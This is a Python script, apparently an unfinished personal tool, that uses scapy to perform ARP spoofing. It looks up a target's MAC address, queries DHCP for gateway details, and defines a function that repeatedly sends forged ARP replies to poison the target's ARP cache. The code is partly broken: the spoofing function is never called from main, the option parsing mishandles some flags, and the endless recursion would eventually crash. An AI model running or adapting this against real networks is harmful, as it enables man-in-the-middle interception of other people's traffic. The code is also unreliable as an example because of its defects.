#!/usr/bin/python

import sys, getopt
from scapy.all import Ether , ARP,conf, get_if_addr,srp1,sendp
from time import sleep
from dhcpclient import DHCPClient
BROADCASTMAC = "ff:ff:ff:ff:ff:ff"
options = {
        "interface" :conf.iface,
        "delay" : 3 , 
        "attackGW" : None , 
        "target" : "127.0.0.1",
        "src": None
    } 
def getTargetMac(target : str)->str : 
    etherAttack = Ether(dst =BROADCASTMAC)
    arpAttack = ARP(pdst = target  , op = "who-has" )
    reply = srp1(etherAttack/arpAttack , iface = options["interface"],verbose=False)
    return reply[Ether].src


def getGetWayIp(): 
    suc = None
    while not suc : 
        client = DHCPClient(iface = options["interface"])
        client.discover().join()
        suc = client.ackOptions
    return suc

def changeArpTable( target : str , src :str )->None:
    etherAttack = Ether(dst =getTargetMac(target))
    arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
    sendp(etherAttack/arpAttack , iface=options["interface"],verbose=False)
    sleep(options["delay"])
    changeArpTable(target,src)


def main(argv :list )->None:
    '''
    usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw]
            -t TARGET
    Spoof ARP tables
    optional arguments:
        -h, --help          show this help message and exit
        -i IFACE, --iface IFACE
                            Interface you wish to use
        -s SRC, --src SRC   The address you want for the attacker
        -d DELAY, --delay DELAY
                            Delay (in seconds) between messages
        -gw                 should GW be attacked as well
        -t TARGET, --target TARGET
                            IP of target
    '''

    try:
        opts, args = getopt.getopt(argv, "s:t:d:gw:h", [
                                    "src=","delay=","target=","getway","help"])
    except getopt.GetoptError as e:
        print(e)
        sys.exit(-1)
    for opt, arg in opts:
        print(opt,arg)
        if opt == '-h':
            print(main.__doc__)
            sys.exit()
        elif opt in ("-i", "--iface"):
            options["interface"] = arg
            #src = get_if_addr()
        elif opt in ("-s", "--src"):
            options["src"] = arg
        elif opt in ("-d", "--delay"):
            options["delay"] = arg
        elif opt in ("-gw", "--getway"):
            options["attackGW"] = True
        elif opt in ("-t", "--target"):
            options["target"] = arg

    if not options["src"]:
        options["src"]=  get_if_addr(options["interface"])
    print(options.items())

    print(getTargetMac("10.100.102.1"))
    print("cool")
    print(getGetWayIp())

if __name__ == "__main__":
    main(sys.argv[1:])


